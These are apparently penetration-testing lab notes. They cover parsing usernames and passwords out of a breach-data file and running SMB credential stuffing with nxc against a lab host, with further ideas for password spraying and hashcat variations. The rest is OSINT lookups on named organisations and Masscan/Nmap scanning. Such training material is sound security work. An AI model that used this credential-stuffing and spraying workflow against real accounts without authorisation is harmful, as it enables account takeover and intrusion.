1. ```nmap 10.130.10.23 -p 3389 --script rdp-ntlm-info --unprivileged -Pn```
2. Get lines containing "@hiboxy.com": `Select-String "@hiboxy.com:" C:\CourseFiles\breachdata.txt | Select-Object -ExpandProperty Line | Out-File -encoding ascii hiboxy_breachdata.txt`
3. Pulling out passwords and usernames
   ```
   Get-Content C:\CourseFiles\hiboxy_breachdata.txt | ForEach-Object { $_.Split('@')[0] } | Out-File -encoding ascii C:\CourseFiles\hiboxy_users.txt
   Get-Content C:\CourseFiles\hiboxy_breachdata.txt | ForEach-Object { $_.Split(':',2)[1] } | Out-File -encoding ascii C:\CourseFiles\hiboxy_passwords.txt
   ```
4. SMB Credential Stuffing ````
```
   nxc smb -u "C:\CourseFiles\hiboxy_users.txt" -p "C:\CourseFiles\hiboxy_passwords.txt" -d hiboxy.com --continue-on-success --no-bruteforce 10.130.10.23
   ```
Would you like to do more? Here are some ideas:

Dump an authoritative list of all users in the domain (using Impacket's GetADUsers.py script), then spray common passwords against them

Spray common passwords (https://weakpasswords.net/) as well as known-breached passwords

Try variations of the known-breached credentials using hashcat rules like best66.rule or your own human intellect (for example, updating a prior breached password of Winter2018! to Summer2024!)

### Reconnaissance and OSINT

1: How Email Flows to a Company
1. Resolve for MX records: `Resolve-DnsName -Type MX -Name lowes.com`
2. Getting a user realm: `Invoke-WebRequest -Uri "https://login.microsoftonline.com/GetUserRealm.srf?login=invalid@sans.org" | Select-Object -ExpandProperty Content | ConvertFrom-Json`
3. Resolving TXT names: `Resolve-DnsName -Type TXT -Name fastenal.com | Where-Object { $_.Strings -like "v=spf1*" }`
4. Use hurricane electric at `bgp.he.net`

2: Finding Public IP Space Owned by a Company
We'll use the Hurricane Electric BGP Toolkit to look up ASNs and IP ranges

3: Identifying Third-Party Services Used by a Company
1. `Resolve-DnsName -Type TXT -Name sans.org | Select-Object -ExpandProperty Strings | sort`

4: Identifying Company Websites
Certificate Transparency is a wonderful thing. It provides a public log of all TLS certificates issued by publicly trusted Certificate Authorities (CAs). We can use this to find websites owned by a given company in a fairly authoritative manner. There are other tools like amass, subfinder, and Findomain that can also be used to find subdomains, but Certificate Transparency is a great place to start.

There are multiple Certificate Transparency search engines available, but we'll use crt.sh for this example
`Invoke-WebRequest -Uri "https://crt.sh/json?identity=clintoncountyin.gov" | Select-Object -ExpandProperty Content | ConvertFrom-Json | Select-Object -ExpandProperty name_value | Sort-Object -Unique | Out-File -FilePath domains_clintoncountyin.gov.txt
`
5: Identifying Breach Data
MFA isn't a panacea, as there are still attacks such as MFA fatigue and SIM swapping

6: Social Media Reconnaissance
For a large enough company, there are often many employees who post on social media about their work. This can include LinkedIn, x.com (formerly Twitter), Facebook, Instagram, and others. Employees may post about new hires, promotions, awards, events, and other company news. This can provide useful information for social engineering attacks, as well as insights into the company's culture and values.

## Masscan
1: Scan Preparation
Masscan bypasses the kernel when it sends packets. That means, when your Linux system receives a SYN-ACK response, your Linux system won't know what to do, and it will respond with a RST. While this scan is noisy, we would like to reduce the impact by preventing these resets. We can do this one of two ways. The first, is to set the firewall to not send RST packets. The second is to use a known source port so the SYN-ACK responses come to a known port, then block traffic to that port. We'll use the latter approach here.

Let's select port 55555 as the source port and create a firewall rule to block packets to this port. Masscan will still detect the packets, so we won't miss the responses, but we do prevent the OS from sending extra RST packets.

`sudo iptables -A INPUT -p tcp --dport 55555 -j DROP`

2: Initial Scan
use the matching source port of 55555 and a rate of 15,000 packets per second. To prevent saturation of the targets due to multiple people performing the scan at the same time, we'll scan our local hosts.

Launch Masscan with the following settings:

Scan all 65536 TCP ports
Rate 15000
Source port of 55555
Save the output in the binary format to a file named local.masscan
Target 127.0.0.1
`sudo masscan --ports 0-65535 --rate 15000 --src-port=55555 -oB /tmp/local.masscan 127.0.0.1`

3: Converting the Scan to XML
`masscan --readscan ~/labs/masscan_10.130.10.0_24_full.bin -oX /tmp/masscan_10.130.10.0_24_full.xml`

4: Grepable Format
`masscan --readscan ~/labs/masscan_10.130.10.0_24_full.bin -oG /tmp/masscan_10.130.10.0_24_full.gnmap`

use grep to find al DNS services: `grep -w 53/open /tmp/masscan_10.130.10.0_24_full.gnmap`

finding systems for likely windows systems: `grep -w 445/open /tmp/masscan_10.130.10.0_24_full.gnmap`

5: JSON Format
`masscan --readscan ~/labs/masscan_10.130.10.0_24_full.bin -oJ /tmp/masscan_10.130.10.0_24_full.json`

6: List Format
`masscan --readscan ~/labs/masscan_10.130.10.0_24_full.bin -oL /tmp/masscan_10.130.10.0_24_full.txt`

7: Extracting Live Hosts and Ports
`grep '/open/tcp' /tmp/masscan_10.130.10.0_24_full.gnmap`

retrieving live hosts: `grep '/open/tcp' /tmp/masscan_10.130.10.0_24_full.gnmap | awk '{print $4}' | sort -uV`

get list of listening ports:
`grep '/open/tcp' /tmp/masscan_10.130.10.0_24_full.gnmap | awk '{print $7}' | sort -uV | head`

grab unique port numbers: `grep '/open/tcp' /tmp/masscan_10.130.10.0_24_full.gnmap | awk '{print $7}' | cut -d '/' -f 1 | sort -un`

## Nmap

1: Initial Scan
`nmap -n 10.130.10.1-10`

2: Scanning 10.130.10.33
`sudo tcpdump -i tun0 -nn net 10.130.10.0/24`

3: Output Formats
`sudo nmap -n -sT 10.130.10.0/24 -oA /tmp/scan -F -T4`

4: Finding Hosts by Open Port
`grep 389/open /tmp/scan.gnmap`

5: The nmap-services File
`less /usr/share/nmap/nmap-services`

6: UDP Scanning
`sudo nmap -n -sU 10.130.10.10`

7: Targeted UDP Scan
`sudo nmap -n -sU 10.130.10.4,10 -p 53,111,414,500-501`